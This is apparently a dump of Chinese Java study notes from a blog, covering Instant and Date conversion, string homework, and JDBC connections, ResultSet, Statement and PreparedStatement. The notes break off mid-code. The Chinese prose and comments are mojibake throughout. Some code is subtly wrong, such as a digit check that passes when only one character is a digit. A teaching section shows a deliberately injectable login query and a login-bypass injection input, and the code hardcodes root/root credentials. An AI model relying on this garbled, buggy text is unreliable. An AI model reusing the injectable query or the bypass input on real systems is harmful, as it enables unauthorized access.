Dateï¼Œæä¾›äº†ä¸€ç³»åˆ—å’Œ Date ç±»è½¬æ¢çš„æ–¹å¼\n\n```java\npackage com.jwt.date_;\n\nimport java.time.Instant;\nimport java.util.Date;\n\npublic class Instant_ {\n    public static void main(String[] args) {\n        //1.é€šè¿‡é™æ€æ–¹æ³•now() è·å–è¡¨ç¤ºå½“å‰æ—¶é—´æˆ³çš„å¯¹è±¡\n        Instant now = Instant.now();\n        System.out.println(now);\n        //2. é€šè¿‡from å¯ä»¥æŠŠInstant è½¬æˆDate\n        Date date = Date.from(now);\n        System.out.println(date);\n        //3. é€šè¿‡date çš„toInstant() å¯ä»¥æŠŠdate è½¬æˆInstant å¯¹è±¡\n        Instant instant = date.toInstant();\n        System.out.println(instant);\n    }\n}\n```\n\n## æœ¬ç« ç»ƒä¹ \n\n### 1.ç¼–ç¨‹é¢˜Homework01.java\n\n(1)å°†å­—ç¬¦ä¸²ä¸­æŒ‡å®šéƒ¨åˆ†è¿›è¡Œåè½¬ã€‚æ¯”å¦‚å°†\"a**bede**f\"åè½¬ä¸º\" a**edeb**f\"\n(2) ç¼–å†™æ–¹æ³•æ¥å®ç°  public static String reverse(String str, int start, int end)\n\n```java\npackage com.jwt.arrays_;\n\npublic class Homework01 {\n    public static void main(String[] args) {\n        String str = \"abedef\";\n        String reverse = null;\n        try {\n            reverse = reverse(str, 1, 4);\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n\n        System.out.println(\"è½¬æ¢åï¼š\" + reverse);\n\n    }\n\n    public static String reverse(String str,int start,int end){\n        if (!(str != null && start >0 && start < end && end < str.length())){\n            throw new RuntimeException(\"å‚æ•°æœ‰è¯¯\");\n        }\n        char[] chars = str.toCharArray();\n        char temp = ' ';\n        for (int i = start,j = end; start < end; start++,end--) {\n            temp = chars[start];\n            chars[start] = chars[end];\n            chars[end] = temp;\n        }\n        return new String(chars);\n    }\n}\n```\n\n### 2.ç¼–ç¨‹é¢˜Homework02.java\n\nè¾“å…¥ç”¨æˆ·åã€å¯†ç ã€é‚®ç®±ï¼Œå¦‚æœä¿¡æ¯å½•å…¥æ­£ç¡®ï¼Œåˆ™æç¤ºæ³¨å†ŒæˆåŠŸï¼Œå¦åˆ™ç”Ÿæˆå¼‚å¸¸å¯¹è±¡ï¼Œè¦æ±‚:\n\n- ç”¨æˆ·åé•¿åº¦éœ€ä¸º2æˆ–3æˆ–4\n- è¦æ±‚å¯†ç çš„é•¿åº¦ä¸º6,ä¸”å…¨æ˜¯æ•°å­—\n- é‚®ç®±ä¸­éœ€åŒ…å«@å’Œ.å¹¶ä¸”@åœ¨.å‰é¢\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Scanner;\n\npublic class Homework02 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥ç”¨æˆ·åï¼š\");\n        String name = scanner.nextLine();\n        System.out.println(\"è¯·è¾“å…¥å¯†ç ï¼š\");\n        String pwd = scanner.nextLine();\n        System.out.println(\"è¯·è¾“å…¥é‚®ç®±ï¼š\");\n        String email = scanner.nextLine();\n        try {\n            userRegister(name,pwd,email);\n            System.out.println(\"æ³¨å†ŒæˆåŠŸ\");\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n\n    }\n\n    public static void userRegister(String name,String pwd,String email){\n        //ç¬¬ä¸€å…³\n        int namelen = name.length();\n        if (!(namelen >=2 && namelen <=4)){\n            throw new RuntimeException(\"ç”¨æˆ·åé•¿åº¦éœ€ä¸º2æˆ–3æˆ–4\");\n        }\n        //ç¬¬äºŒå…³\n        if(!(pwd.length()==6 && isdig(pwd))){\n            throw new RuntimeException(\"è¦æ±‚å¯†ç çš„é•¿åº¦ä¸º6,ä¸”å…¨æ˜¯æ•°å­—\");\n        }\n        //ç¬¬ä¸‰å…³\n        int i = email.indexOf('@');\n        int j = email.indexOf('.');\n        if (!(i > 0 && j > i)){\n            throw new RuntimeException(\"é‚®ç®±ä¸­éœ€åŒ…å«@å’Œ.å¹¶ä¸”@åœ¨.å‰é¢\");\n        }\n\n    }\n\n    public static boolean isdig(String str){\n        char[] chars = str.toCharArray();\n        for (int i = 0; i < chars.length; i++) {\n            if(Character.isDigit(chars[i]))\n                return true;\n        }\n        return false;\n    }\n}\n```\n\n### 3.ç¼–ç¨‹é¢˜Homework03.java\n\n(1)ç¼–å†™javaç¨‹åºï¼Œè¾“å…¥å½¢å¼ä¸º: Han shun Pingçš„äººåï¼Œä»¥Ping, Han .Sçš„å½¢å¼æ‰“å°å‡ºæ¥ã€‚å…¶ä¸­.Sæ˜¯ä¸­é—´å•è¯çš„é¦–å­—æ¯ã€‚\n(2)ä¾‹å¦‚è¾“å…¥\"Willian Jefferson Clinton\"ï¼Œè¾“å‡ºå½¢å¼ä¸º: Clinton, Willian .J\n\n```java\n//æˆ‘å†™çš„è¾£é¸¡ä»£ç \npackage com.jwt.arrays_;\nimport java.util.Scanner;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥åå­—ï¼š\");\n        String s = scanner.nextLine();\n        String[] s1 = s.split(\" \");\n        char[] chars = s1[1].toCharArray();\n        System.out.println(s1[2] + \" ,\" + s1[0] + \" .\" + Character.toUpperCase(chars[0]));\n    }\n}\n\n//æ ‡å‡†ç­”æ¡ˆ\npackage com.jwt.arrays_;\nimport java.util.Scanner;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥åå­—ï¼š\");\n        String str = scanner.nextLine();\n        try {\n            printName(str);\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n    public static void printName(String str){\n        if (str == null){\n            throw new RuntimeException(\"str ä¸èƒ½ä¸ºç©º\");\n        }\n        String[] name = str.split(\" \");\n        if (name.length != 3){\n            throw new RuntimeException(\"str æ ¼å¼é”™è¯¯\");\n        }\n        String format = String.format(\"%s,%s .%c\", name[2], name[0], name[1].toUpperCase().charAt(0));\n        System.out.println(format);\n    }\n\n}\n\n```\n\n### 4.ç¼–ç¨‹é¢˜Homework04.java\n\nè¾“å…¥å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­é‡Œé¢æœ‰å¤šå°‘ä¸ªå¤§å†™å­—æ¯ï¼Œå¤šå°‘ä¸ªå°å†™å­—æ¯ï¼Œå¤šå°‘ä¸ªå­—æ¯ï¼Œå¤šå°‘ä¸ªæ•°å­—\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Scanner;\npublic class Homework04 {\n    //è¾“å…¥å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­é‡Œé¢æœ‰å¤šå°‘ä¸ªå¤§å†™å­—æ¯ï¼Œå¤šå°‘ä¸ªå°å†™å­—æ¯ï¼Œå¤šå°‘ä¸ªæ•°å­—\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¯·è¾“å…¥ï¼š\");\n        String s = scanner.nextLine();\n        char[] chars = s.toCharArray();\n        int Upcount = 0 ;\n        int Lowcount = 0 ;\n        int LetNum = 0;\n        int DigNum = 0;\n        for (int i = 0; i < chars.length; i++) {\n            if(Character.isUpperCase(chars[i]))\n                Upcount++;\n            if(Character.isLowerCase(chars[i]))\n                Lowcount++;\n            if(Character.isLetter(chars[i]))\n                LetNum++;\n            if(Character.isDigit(chars[i]))\n                DigNum++;\n        }\n        System.out.println(\"å¤§å†™å­—æ¯ä¸ªæ•°ï¼š\"+ Upcount);\n        System.out.println(\"å°å†™å­—æ¯ä¸ªæ•°ï¼š\"+ Lowcount);\n        System.out.println(\"å­—æ¯ä¸ªæ•°ï¼š\"+ LetNum);\n        System.out.println(\"æ•°å­—ä¸ªæ•°ï¼š\"+ DigNum);\n    }\n}\n```\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¸¸ç”¨ç±»"],"categories":["JavaSE"]},{"title":"Java-JDBC","url":"/posts/146.html","content":"\n### å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-JDBCã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡3å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-06\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-08\n- [x] ğŸ€æ€»ç»“ï¼šæŒ‰æ—¶å®Œæˆä»»åŠ¡ï¼Œç»§ç»­ä¸‹ä¸€ä¸ª ğŸš©\n\n###  1.Java JDBC\n\n> JDBCçš„å…¨ç§°æ˜¯Javaæ•°æ®åº“è¿æ¥(Java DataBase Connectivity)ï¼Œå®ƒæ˜¯ä¸€å¥—ç”¨äºæ‰§è¡ŒSQLè¯­å¥çš„Java APIã€‚\n>\n> Javaç¨‹åºå‘˜ä½¿ç”¨JDBCå¯ä»¥è¿æ¥ä»»ä½•æä¾›äº†JDBCé©±åŠ¨ç¨‹åºçš„æ•°æ®åº“ç³»ç»Ÿï¼Œä»è€Œå®Œæˆå¯¹æ•°æ®åº“çš„å„ç§æ“ä½œã€‚\n\nJavaç¨‹åº JDBC API ä½¿ç”¨ JDBC é©±åŠ¨ç®¡ç†å™¨å¹¶æŒ‡å®šæ•°æ®åº“çš„ JDBC é©±åŠ¨å™¨æ¥æä¾›ä¸æ•°æ®åº“çš„è¿æ¥ã€‚\n\n![](https://img.jwt1399.top/img/jdbc-1720249.jpeg)**JDBC ç¨‹åºå®ä¾‹**\n\nå‰ç½®å·¥ä½œï¼š\n\nMysqlé©±åŠ¨ä¸‹è½½ï¼š[MySQL :: Download Connector](https://dev.mysql.com/downloads/connector/j/)ï¼Œé€‰æ‹©æ“ä½œç³»ç»Ÿï¼šPlatform Independent\n\nåœ¨é¡¹ç›®ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ libs å°†ä¸‹è½½çš„ mysql.jar é©±åŠ¨æ‹·è´åˆ°è¯¥ç›®å½•ä¸‹ï¼Œåœ¨ IDEA ä¸­å³é”®ç‚¹å‡» mysql.jar é€‰æ‹© add to Library (åŠ å…¥åˆ°é¡¹ç›®ä¸­)\n\n```java\npackage com.jwt.jdbc;\n\n\nimport com.mysql.jdbc.Driver;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class myjdbc {\n    public static void main(String[] args) throws SQLException {\n        //1. æ³¨å†Œé©±åŠ¨\n        Driver driver = new Driver(); //åˆ›å»ºdriver å¯¹è±¡\n\n        //2. å¾—åˆ°è¿æ¥\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        //å°†ç”¨æˆ·åå’Œå¯†ç æ”¾å…¥åˆ°Propertieså¯¹è±¡\n        Properties info = new Properties();\n        info.setProperty(\"user\", \"root\");// ç”¨æˆ·\n        info.setProperty(\"password\", \"root\"); //å¯†ç \n        Connection connect = driver.connect(url, info);\n\n        //3. æ‰§è¡Œsql\n        String sql = \"insert into jwt.jwt_info value (3,'Pyj') \";\n        //statement ç”¨äºæ‰§è¡Œé™æ€SQLè¯­å¥å¹¶è¿”å›å…¶ç”Ÿæˆçš„ç»“æœçš„å¯¹è±¡\n        Statement statement = connect.createStatement();\n        int rows = statement.executeUpdate(sql); // dml(update insert delete)è¯­å¥ï¼Œè¿”å›çš„å°±æ˜¯å½±å“è¡Œæ•°\n        System.out.println(rows > 0 ? \"æˆåŠŸ\" : \"å¤±è´¥\");\n\n        //4. å…³é—­è¿æ¥èµ„æº\n        statement.close();\n        connect.close();\n    }\n}\n```\n\n### 2.äº”ç§è¿æ¥æ–¹å¼\n\n#### æ–¹å¼1\n\n```java\n //1. æ³¨å†Œé©±åŠ¨\n Driver driver = new Driver();\n String url = \"jdbc:mysql://localhost:3306/jwt\";\n //å°†ç”¨æˆ·åå’Œå¯†ç æ”¾å…¥åˆ°Propertieså¯¹è±¡\n Properties properties = new Properties();\n properties.setProperty(\"user\",\"root\");\n properties.setProperty(\"password\",\"root\");\n //2. å¾—åˆ°è¿æ¥\n Connection connection = driver.connect(url, properties);\n```\n\n#### æ–¹å¼2\n\n```java\n//ä½¿ç”¨åå°„åŠ è½½Driverç±», åŠ¨æ€åŠ è½½ï¼Œæ›´åŠ çš„çµæ´»ï¼Œå‡å°‘ä¾èµ–æ€§\nClass<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\nDriver driver = (Driver) aClass.newInstance();\n//å°†ç”¨æˆ·åå’Œå¯†ç æ”¾å…¥åˆ°Propertieså¯¹è±¡\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nProperties properties = new Properties();\nproperties.setProperty(\"user\",\"root\");\nproperties.setProperty(\"password\",\"root\");\n//å¾—åˆ°è¿æ¥\nConnection connection = driver.connect(url, properties);\n```\n\n#### æ–¹å¼3\n\n```java\n//ä½¿ç”¨DriverManageræ›¿ä»£driverè¿›è¡Œç»Ÿä¸€ç®¡ç†\nClass<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\nDriver driver = (Driver) aClass.newInstance();\n//åˆ›å»ºurl å’Œuser å’Œpassword\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nString user = \"root\";\nString password = \"root\";\n//æ³¨å†ŒDriveré©±åŠ¨\nDriverManager.registerDriver(driver);\n//å¾—åˆ°è¿æ¥\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### æ–¹å¼4\n\n```java\n//ä½¿ç”¨Class.forNameè‡ªåŠ¨å®Œæˆæ³¨å†Œé©±åŠ¨ï¼Œç®€åŒ–ä»£ç  \nClass.forName(\"com.mysql.jdbc.Driver\");\n//åˆ›å»ºurl å’Œuser å’Œpassword\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nString user = \"root\";\nString password = \"root\";\n//å¾—åˆ°è¿æ¥\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### æ–¹å¼5\n\nç¬¬ä¸€æ­¥ï¼šsrcä¸‹æ–°å»ºæ–‡ä»¶mysql.properties\n\n```\nurl=jdbc:mysql://localhost:3306/jwt\nuser=root\npassword=root\ndriver=com.mysql.jdbc.Driver\n```\n\nç¬¬äºŒæ­¥ï¼š\n\n```java\n//åœ¨æ–¹å¼4çš„åŸºç¡€ä¸Šæ”¹è¿›ï¼Œå¢åŠ é…ç½®æ–‡ä»¶ï¼Œè®©è¿æ¥mysqlæ›´åŠ çµæ´»\n//é€šè¿‡Properties å¯¹è±¡è·å–é…ç½®æ–‡ä»¶çš„ä¿¡æ¯\nProperties properties = new Properties();\nproperties.load(new FileInputStream(\"src//mysql.properties\"));//windowsè·¯å¾„çš„//æ”¹æˆ\\\\\n//è·å–ç›¸å…³çš„å€¼\nString url = properties.getProperty(\"url\");\nString user = properties.getProperty(\"user\");\nString password = properties.getProperty(\"password\");\nString driver = properties.getProperty(\"driver\");\n//1. æ³¨å†Œé©±åŠ¨\nClass.forName(driver);//å»ºè®®å†™ä¸Š\n//2. å¾—åˆ°è¿æ¥\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### å¸¸ç”¨é©±åŠ¨ç¨‹åºåç§°å’ŒURL\n\n| DBMS       | JDBCé©±åŠ¨ç¨‹åºåç§°                | URLæ ¼å¼                                      |\n| ---------- | ------------------------------- | -------------------------------------------- |\n| MySQL      | com.mysql.jdbc.Driver           | jdbc:mysql://hostname:port/databaseName      |\n| Oracle     | oracle.jdbc.driver.OracleDriver | jdbc:oracle:thin:@hostname:port:databaseName |\n| PostgreSQL | org.postgresql.Driver           | jdbc:postgresql://hostname:port/dbname       |\n| DB2        | com.ibm.db2.jdbc.net.DB2Driver  | jdbc:db2:hostname:port/databaseName          |\n| Sybase     | com.sybase.jdbc.SybDriver       | jdbc:sybase:Tds:hostname: port/databaseName  |\n\n#### Junitæµ‹è¯•\n\n```java\npackage com.jwt.jdbc;\n\nimport com.mysql.jdbc.Driver;\nimport org.junit.Test;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\npublic class jdbcConn {\n\n    //æ–¹å¼1\n    @Test\n    public void connect01() throws SQLException {\n        //1. æ³¨å†Œé©±åŠ¨\n        Driver driver = new Driver();\n        //2. å¾—åˆ°è¿æ¥\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        Properties properties = new Properties();\n        properties.setProperty(\"user\",\"root\");\n        properties.setProperty(\"password\",\"root\");\n        Connection connection = driver.connect(url, properties);\n        System.out.println(\"ç¬¬1ç§æ–¹å¼:\"+connection);\n    }\n\n    //æ–¹å¼2 ä½¿ç”¨åå°„åŠ è½½Driverç±»\n    @Test\n    public void connect02() throws ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {\n        //ä½¿ç”¨åå°„åŠ è½½Driverç±», åŠ¨æ€åŠ è½½ï¼Œæ›´åŠ çš„çµæ´»ï¼Œå‡å°‘ä¾èµ–æ€§\n        Class<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\n        Driver driver = (Driver) aClass.newInstance();\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        Properties properties = new Properties();\n        properties.setProperty(\"user\",\"root\");\n        properties.setProperty(\"password\",\"root\");\n        Connection connection = driver.connect(url, properties);\n        System.out.println(\"ç¬¬2ç§æ–¹å¼:\"+connection);\n\n    }\n\n    //æ–¹å¼3 ä½¿ç”¨DriverManager æ›¿ä»£driver è¿›è¡Œç»Ÿä¸€ç®¡ç†\n    @Test\n    public  void connect03() throws ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {\n        //ä½¿ç”¨åå°„åŠ è½½Driver\n        Class<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\n        Driver driver = (Driver) aClass.newInstance();\n        //åˆ›å»ºurl å’Œuser å’Œpassword\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        String user = \"root\";\n        String password = \"root\";\n        //æ³¨å†ŒDriveré©±åŠ¨\n        DriverManager.registerDriver(driver);\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"ç¬¬3ç§æ–¹å¼:\"+connection);\n    }\n\n    //æ–¹å¼4: ä½¿ç”¨Class.forName è‡ªåŠ¨å®Œæˆæ³¨å†Œé©±åŠ¨ï¼Œç®€åŒ–ä»£ç \n    @Test\n    public  void connect04() throws ClassNotFoundException, SQLException {\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        //åˆ›å»ºurl å’Œuser å’Œpassword\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        String user = \"root\";\n        String password = \"root\";\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"ç¬¬4ç§æ–¹å¼:\"+connection);\n    }\n    //æ–¹å¼5: åœ¨æ–¹å¼4 çš„åŸºç¡€ä¸Šæ”¹è¿›ï¼Œå¢åŠ é…ç½®æ–‡ä»¶ï¼Œè®©è¿æ¥mysql æ›´åŠ çµæ´»\n    @Test\n    public  void connect05() throws ClassNotFoundException, SQLException, IOException {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Class.forName(driver);//å»ºè®®å†™ä¸Š\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"ç¬¬5ç§æ–¹å¼:\"+connection);\n    }\n}\n```\n\n### 3.ResultSet\n\n- ä»æ•°æ®åº“æŸ¥è¯¢è¯»å–æ•°æ®ï¼Œè¿”å›çš„æ•°æ®æ”¾åœ¨ç»“æœé›†ä¸­\n\n- ResultSetå¯¹è±¡ä¿æŒä¸€ä¸ªå…‰æ ‡æŒ‡å‘å…¶å½“å‰çš„æ•°æ®è¡Œã€‚ æœ€åˆï¼Œ å…‰æ ‡ä½äºç¬¬ä¸€è¡Œä¹‹å‰\n- nextæ–¹æ³•å°†å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œï¼Œå¹¶ä¸”åœ¨ResultSetå¯¹è±¡ä¸­æ²¡æœ‰æ›´å¤šè¡Œæ—¶è¿”å›falseï¼Œå› æ­¤å¯ä»¥åœ¨whileå¾ªç¯ä¸­ä½¿ç”¨å¾ªç¯æ¥éå†ç»“æœé›†\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\nimport java.sql.ResultSet;\n\npublic class ResultSet_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        //é€šè¿‡Properties å¯¹è±¡è·å–é…ç½®æ–‡ä»¶çš„ä¿¡æ¯\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //è·å–ç›¸å…³çš„å€¼\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. æ³¨å†Œé©±åŠ¨\n        Class.forName(driver);//å»ºè®®å†™ä¸Š\n        //2. å¾—åˆ°è¿æ¥\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. å¾—åˆ°Statement\n        Statement statement = connection.createStatement();\n        //4. æ‰§è¡ŒSQL\n        String sql = \"select id, name from jwt_info\";\n        ResultSet resultSet = statement.executeQuery(sql);//è¯¥è¯­å¥è¿”å›å•ä¸ªResultSetå¯¹è±¡\n        //5. ä½¿ç”¨while å–å‡ºæ•°æ®\n        while (resultSet.next()) { // è®©å…‰æ ‡å‘åç§»åŠ¨ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œï¼Œåˆ™è¿”å›false\n            int id = resultSet.getInt(1); //é€šè¿‡ç´¢å¼•è·å–è¯¥è¡Œçš„ç¬¬1åˆ—\n            //String name = resultSet.getString(2);//é€šè¿‡ç´¢å¼•è·å–è¯¥è¡Œçš„ç¬¬2åˆ—\n            String name = resultSet.getString(\"name\");//é€šè¿‡åˆ—åè·å–è¯¥è¡Œçš„ç¬¬2åˆ—\n            System.out.println(id + \"\\t\" + name + \"\\t\" );\n        }\n        //6. å…³é—­è¿æ¥\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n}\n```\n\n### 4.Statement\n\n- Statementå¯¹è±¡ç”¨äºæ‰§è¡Œé™æ€SQLè¯­å¥å¹¶è¿”å›å…¶ç”Ÿæˆçš„ç»“æœçš„å¯¹è±¡\n- Statementå¯¹è±¡æ‰§è¡ŒSQLè¯­å¥ï¼Œ`å­˜åœ¨SQLæ³¨å…¥é£é™©`\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class Statement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //è®©ç”¨æˆ·è¾“å…¥ç®¡ç†å‘˜åå’Œå¯†ç \n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: \"); //next(): å½“æ¥æ”¶åˆ°ç©ºæ ¼æˆ–è€…'å°±æ˜¯è¡¨ç¤ºç»“æŸ\n        String admin_name = scanner.nextLine(); //å¦‚æœå¸Œæœ›çœ‹åˆ°SQL æ³¨å…¥ï¼Œè¿™é‡Œéœ€è¦ç”¨nextLine\n        System.out.print(\"è¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : \");\n        String admin_pwd = scanner.nextLine();\n      \n        //é€šè¿‡Properties å¯¹è±¡è·å–é…ç½®æ–‡ä»¶çš„ä¿¡æ¯\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //è·å–ç›¸å…³çš„å€¼\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. æ³¨å†Œé©±åŠ¨\n        Class.forName(driver);//å»ºè®®å†™ä¸Š\n        //2. å¾—åˆ°è¿æ¥\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. å¾—åˆ°Statement\n        Statement statement = connection.createStatement();\n        //4. ç»„ç»‡SqL\n        String sql = \"select name , password from user where name ='\"\n                + admin_name + \"' and password = '\" + admin_pwd + \"'\";\n        ResultSet resultSet = statement.executeQuery(sql);\n        if (resultSet.next()) { //å¦‚æœæŸ¥è¯¢åˆ°ä¸€æ¡è®°å½•ï¼Œåˆ™è¯´æ˜è¯¥ç®¡ç†å­˜åœ¨\n            System.out.println(\"æ­å–œï¼Œ ç™»å½•æˆåŠŸ\");\n        } else {\n            System.out.println(\"å¯¹ä¸èµ·ï¼Œç™»å½•å¤±è´¥\");\n        }\n        //å…³é—­è¿æ¥\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n}\n```\n\næ­£å¸¸ç™»é™†\n\n```bash\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: Tom\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : 123\næ­å–œï¼Œ ç™»å½•æˆåŠŸ\n```\n\nSqlæ³¨å…¥ç™»é™†\n\n```bash\nè¯·è¾“å…¥ç®¡ç†å‘˜çš„åå­—: Tom' or \nè¯·è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç : or '1'='1\næ­å–œï¼Œ ç™»å½•æˆåŠŸ\n```\n\n### 5.PreparedStatement\n\n#### ç®€ä»‹\n\nPreparedStatementæ¥å£æ‰©å±•äº†Statementæ¥å£ï¼Œå®ƒæ·»åŠ äº†æ¯”Statementå¯¹è±¡æ›´å¥½ä¸€äº›ä¼˜ç‚¹çš„åŠŸèƒ½ã€‚æ­¤è¯­å¥å¯ä»¥åŠ¨æ€åœ°æä¾›/æ¥å—å‚æ•°ã€‚\n\n1. PreparedStatementæ‰§è¡Œçš„SQLè¯­å¥ä¸­çš„å‚æ•°ç”¨é—®å·(?)æ¥è¡¨ç¤ºï¼Œ\n2. è°ƒç”¨setXxx()æ–¹æ³•æ¥è®¾ç½®å‚æ•°ï¼ŒsetXxx()æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è®¾ç½®çš„SQLè¯­å¥ä¸­çš„å‚æ•°çš„ç´¢å¼•(ä»1å¼€å§‹)ï¼Œç¬¬äºŒä¸ªæ˜¯è®¾ç½®çš„SQLè¯­å¥ä¸­çš„å‚æ•°çš„å€¼\n3. è°ƒç”¨executeQuery()ï¼Œæ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿”å›ResultSetå¯¹è±¡\n4. è°ƒç”¨executeUpdate()ï¼Œæ‰§è¡Œæ›´æ–°(å¢ã€åˆ ã€æ”¹)ï¼Œè¿”å›å—å½±å“çš„è¡Œæ•°\n\n**é¢„å¤„ç†çš„å¥½å¤„**\n\n- ä¸å†ä½¿ç”¨+æ‹¼æ¥sqlè¯­å¥ï¼Œå‡å°‘è¯­æ³•é”™è¯¯\n- æœ‰æ•ˆçš„è§£å†³äº†sqlæ³¨å…¥é—®é¢˜ï¼\n- å¤§å¤§å‡å°‘äº†ç¼–è¯‘æ¬¡æ•°ï¼Œæ•ˆç‡è¾ƒé«˜\n\n#### æ‰§è¡ŒæŸ¥è¯¢\n\n```java\npackage 